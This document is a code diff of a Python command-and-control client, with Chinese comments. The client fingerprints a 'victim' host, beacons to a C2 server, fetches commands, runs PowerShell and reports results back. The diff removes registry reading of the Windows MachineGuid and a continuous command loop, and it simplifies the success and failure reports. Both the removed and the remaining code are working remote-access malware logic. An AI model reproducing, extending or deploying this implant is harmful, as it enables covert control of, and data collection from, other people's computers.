@@ -8,7 +8,6 @@ import platform
 import socket
 import time
 import psutil
-import winreg
 from flask import request, jsonify
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import unpad
@@ -36,22 +35,11 @@ def get_md5_of_hostname():
 def generate_random_id():
     return random.randbytes(8)
 
-def get_machine_guid():
-    try:
-        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography")
-        guid, _ = winreg.QueryValueEx(key, "MachineGuid")
-        # guid_bytes = guid.encode('utf-8')
-        return guid
-    except Exception as e:
-        print(f"Error retrieving MachineGuid: {str(e)}")
-        return None
-    
 # 構建 24 bytes 資訊
 def construct_message(prefix: str):
     prefix_bytes = prefix.encode('utf-8')  # 固定前綴
     md5_hash_part = get_md5_of_hostname()  # 主機名稱的 MD5 前 8 bytes
     random_id = generate_random_id()  # 隨機生成的識別碼
-
     message = prefix_bytes + md5_hash_part + random_id
     return message
 
@@ -96,10 +84,9 @@ def getinfo():
         "os_details": platform.platform(),
         "system_uptime": time.time() - psutil.boot_time(),
         "cpu_info": platform.processor(),
-        # "system_locale": "zh-TW",
+        "system_locale": "zh-TW",
         "timezone": time.tzname,
-        # "network_status": "Connected",
-        "machine_guid": get_machine_guid()
+        "network_status": "Connected",
     }
     return victim_info
 
@@ -167,7 +154,7 @@ def decrypt_data(encrypted_data, aes_key):
 def get_and_execute_command_from_c2(c2_url):
     try:
         # 向 C2 server 發送請求以獲取指令
-        response = requests.post(f'{c2_url}/send_pending_command')
+        response = requests.post(f'{c2_url}/get_command')
         
         if response.status_code == 200:
             command_data = response.json()
@@ -209,15 +196,15 @@ def execute_powershell_script(script):
     # if err:
     #     print(f"PowerShell Error: {err.decode()}")
 
-def send_success_report(c2_url, output, prefix):
-    response = requests.post(f'{c2_url}/report_success', json={"status": "OK", "prefix": prefix, "output": output})
+def send_success_report(c2_url):
+    response = requests.post(f'{c2_url}/report_success', json={"status": "OK"})
     if response.status_code == 200:
         print("Success reported to C2 server")
     else:
         print("Failed to report success")
 
-def send_failure_report(c2_url, reason, prefix):
-    response = requests.post(f'{c2_url}/report_failure', json={"status": "FAILED", "prefix": prefix, "reason": reason})
+def send_failure_report(c2_url, reason):
+    response = requests.post(f'{c2_url}/report_failure', json={"status": "FAILED", "reason": reason})
     if response.status_code == 200:
         print("Failure reported to C2 server")
     else:
@@ -253,37 +240,33 @@ def main():
                 send_info_response = send_victim_info(c2_url, info)
                 if send_info_response['message'] == 'success':
                     print(send_info_response['status'])
-                elif send_info_response['message'] == 'fail':
-                    print(send_info_response['status'])
-                    # return
 
 
-                time.sleep(3)
+                time.sleep(5)
                 response3 = communicate_with_c2(c2_url, PREFIXES['command_request'])
                 if response3['message'] == 'keep':
-                    while True:
-                        # 步驟1: 向 C2 server 要求命令並執行
-                        # encrypted_command = str.encode(get_command_from_c2(c2_url))
-                        output = get_and_execute_command_from_c2(c2_url)
-                        if output is None:
-                            print("Failed to get or execute command from C2 server")
-                            return
-                        else:
-                            print(f"Output after execution: {output}")
-                            # print(type(encrypted_command))
-                            
-                        # 步驟2: 將執行結果傳給 server
-                        try:
-                            # decrypted_command = decrypt_data(encrypted_command, aes_key)
-                            # print(f"Decrypted Command: {decrypted_command}")
-                            # 告訴C2命令執行成功
-                            send_success_report(c2_url, output, PREFIXES['operation_success'])
-                            time.sleep(3)
-                        except Exception as e:
-                            print(f"Error executing command: {str(e)}")
-                            send_failure_report(c2_url, "Execution failed", PREFIXES['operation_failed'])
-                            time.sleep(5)
-                            return
+                    # 步驟1: 向 C2 server 要求命令
+                    # encrypted_command = str.encode(get_command_from_c2(c2_url))
+                    output = get_and_execute_command_from_c2(c2_url)
+                    if output is None:
+                        print("Failed to get or execute command from C2 server")
+                        return
+                    else:
+                        print(f"Output after execution: {output}")
+                        # print(type(encrypted_command))
+                        
+                    # 步驟2: 解密命令
+                    try:
+                        # decrypted_command = decrypt_data(encrypted_command, aes_key)
+                        # print(f"Decrypted Command: {decrypted_command}")
+                        # 模擬執行命令
+                        # print("Executing command...")
+                        # 告訴C2命令執行成功
+                        send_success_report(c2_url)
+                    except Exception as e:
+                        print(f"Error executing command: {str(e)}")
+                        send_failure_report(c2_url, "Execution failed")
+                        return
 
             else:
                 print("Key update failed.")
